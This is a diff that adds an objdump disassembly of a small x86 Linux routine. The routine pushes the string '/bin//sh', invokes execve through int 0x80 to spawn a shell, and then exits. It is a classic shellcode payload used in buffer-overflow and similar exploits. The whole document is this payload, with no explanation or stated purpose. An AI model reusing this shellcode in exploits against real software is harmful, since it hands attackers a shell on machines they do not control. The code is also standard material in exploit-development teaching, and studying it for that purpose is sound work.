@@ -1,0 +1,16 @@
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:   31 c0                   xor    %eax,%eax
+   2:   50                      push   %eax
+   3:   68 2f 2f 73 68          push   $0x68732f2f
+   8:   68 2f 62 69 6e          push   $0x6e69622f
+   d:   89 e3                   mov    %esp,%ebx
+   f:   31 c9                   xor    %ecx,%ecx
+  11:   31 d2                   xor    %edx,%edx
+  13:   b0 0b                   mov    $0xb,%al
+  15:   cd 80                   int    $0x80
+  17:   31 c0                   xor    %eax,%eax
+  19:   b0 01                   mov    $0x1,%al
+  1b:   31 db                   xor    %ebx,%ebx
+  1d:   cd 80                   int    $0x80
